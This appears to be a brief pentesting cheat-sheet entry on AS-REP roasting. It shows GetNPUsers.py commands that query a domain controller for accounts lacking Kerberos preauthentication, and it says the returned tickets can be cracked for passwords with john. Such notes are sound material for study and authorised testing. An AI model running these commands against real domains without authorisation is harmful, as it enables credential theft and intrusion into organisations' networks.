https://www.youtube.com/watch?v=pZSyGRjHNO4

This script check if the user you specify has the `Do not require Kerberos preauthentication` property set. 

(This means these accounts are vulnerable to ASREP Roasting)

---

You will need to provide a username. 
`python3 GetNPUsers.py -dc-ip 192.168.1.105 DOMAIN.local/username`


If you want to provide a list of names 
```
python3 GetNPUsers.py -dc-ip 192.168.1.105 DOMAIN.local/  -usersfile users.txt
```

---

It will spit out TGT (ticket granting ticket) for that user if vulnerable. 

The TGT can actually be cracked for a password using john